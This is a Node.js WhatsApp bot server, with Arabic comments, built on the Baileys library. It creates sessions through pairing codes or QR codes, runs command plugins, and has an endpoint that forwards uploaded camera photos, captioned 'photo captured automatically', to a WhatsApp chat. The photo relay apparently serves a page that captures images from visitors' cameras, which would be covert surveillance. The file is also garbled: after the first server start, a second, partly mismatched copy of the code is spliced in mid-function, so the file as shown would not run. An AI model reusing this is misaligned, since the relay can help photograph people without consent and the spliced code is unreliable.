const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const qrcode = require('qrcode');
const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');

const app = express();
const PORT = process.env.PORT || 3000;

// تخزين الجلسات
const sessions = {};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// إعداد رفع الصور
const upload = multer({ dest: path.join(__dirname, 'uploads') });

// تحميل الأوامر
const commands = [];
const commandsPath = path.join(__dirname, 'commands');
if (fs.existsSync(commandsPath)) {
    fs.readdirSync(commandsPath).forEach(file => {
        if (file.endsWith('.js')) {
            const command = require(path.join(commandsPath, file));
            if (typeof command === 'function') commands.push(command);
        }
    });
}

// ✅ إنشاء جلسة واتساب
async function createSession(sessionId) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // الرسائل
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

        const reply = async (message) => {
            await sock.sendMessage(from, { text: message });
        };

        for (const command of commands) {
            await command({ text, reply, sock, msg, from, sessionId });
        }
    });

    return sock;
}

// ✅ طلب رمز الاقتران (Pairing Code)
app.post('/create-session', async (req, res) => {
    try {
        const { sessionId, phone } = req.body;
        if (!sessionId || !phone) return res.status(400).json({ error: 'أدخل معرف الجلسة ورقم الهاتف' });

        const sock = await createSession(sessionId);
        if (!sock.authState.creds.registered) {
            let code = await sock.requestPairingCode(phone);
            code = code.match(/.{1,4}/g).join('-');
            return res.json({ pairingCode: code });
        }

        res.json({ message: 'تم الاتصال مسبقاً' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ✅ توليد QR Code للجلسة
app.get('/generate-qr', async (req, res) => {
    try {
        const { sessionId } = req.query;
        if (!sessionId) return res.status(400).send('يرجى إدخال معرف الجلسة');

        const sock = await createSession(sessionId);
        sock.ev.on('connection.update', async (update) => {
            if (update.qr) {
                const qrImage = await qrcode.toDataURL(update.qr);
                res.send(`
                    <html>
                        <body style="background:#111; color:#fff; text-align:center; padding:50px;">
                            <h1>امسح QR من واتساب</h1>
                            <img src="${qrImage}" />
                            <p style="margin-top:20px; font-size:18px;">افتح واتساب > الأجهزة المرتبطة > اربط الجهاز</p>
                        </body>
                    </html>
                `);
            }
        });
    } catch (err) {
        res.status(500).send('خطأ: ' + err.message);
    }
});

// ✅ استقبال الصور من الكاميرا
app.post('/upload-photo', upload.array('photos', 2), async (req, res) => {
    const { chat, sessionId } = req.body;
    if (!chat || !sessionId || !sessions[sessionId]) {
        return res.status(400).json({ error: 'الجلسة غير موجودة أو البيانات ناقصة' });
    }

    const sock = sessions[sessionId];
    for (const file of req.files) {
        await sock.sendMessage(chat, {
            image: fs.readFileSync(file.path),
            caption: '📸 صورة تم التقاطها تلقائيًا'
        });
        fs.unlinkSync(file.path);
    }

    res.json({ message: '✅ الصور أُرسلت بنجاح' });
});

app.listen(PORT, () => console.log(`✅ السيرفر يعمل على http://localhost:${PORT}`));    fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // ✅ الاستماع للرسائل
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

        const reply = async (message) => {
            try {
                await sock.sendMessage(from, { text: message });
            } catch (err) {
                console.error('خطأ في الرد:', err);
            }
        };

        // ✅ تنفيذ الأوامر داخل async loop
        for (const command of commands) {
            try {
                await command({ text, reply, sock, msg, from, sessionId });
            } catch (e) {
                console.error('خطأ في تنفيذ أمر:', e);
            }
        }
    });

    // ✅ طلب رمز الاقتران لو الحساب غير مسجل
    if (!sock.authState.creds.registered) {
        let code = await sock.requestPairingCode(phone);
        code = code.match(/.{1,4}/g).join('-');
        return { pairingCode: code };
    }

    return { message: 'تم الاتصال بنجاح' };
}

// ✅ API لإنشاء جلسة جديدة
app.post('/create-session', async (req, res) => {
    try {
        const { sessionId, phone } = req.body;
        if (!sessionId || !phone) return res.status(400).json({ error: 'أدخل معرف الجلسة ورقم الهاتف' });

        const result = await createSession(sessionId, phone);
        res.json(result);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ✅ عرض الجلسات النشطة
app.get('/sessions', (req, res) => {
    res.json(Object.keys(sessions));
});

// ✅ استقبال الصور من الكاميرا وإرسالها للواتساب
app.post('/upload-photo', upload.array('photos', 2), async (req, res) => {
    try {
        const { chat, sessionId } = req.body;

        if (!chat) return res.status(400).json({ error: 'يرجى تحديد رقم المحادثة (chat)' });
        if (!sessionId || !sessions[sessionId]) return res.status(400).json({ error: 'الجلسة غير متصلة أو غير موجودة' });

        const sock = sessions[sessionId];
        for (const file of req.files) {
            const imageBuffer = fs.readFileSync(file.path);
            await sock.sendMessage(chat, { image: imageBuffer, caption: '📸 صورة تم التقاطها تلقائيًا' });
            fs.unlinkSync(file.path);
        }

        res.json({ message: '✅ تم إرسال الصور بنجاح' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
});
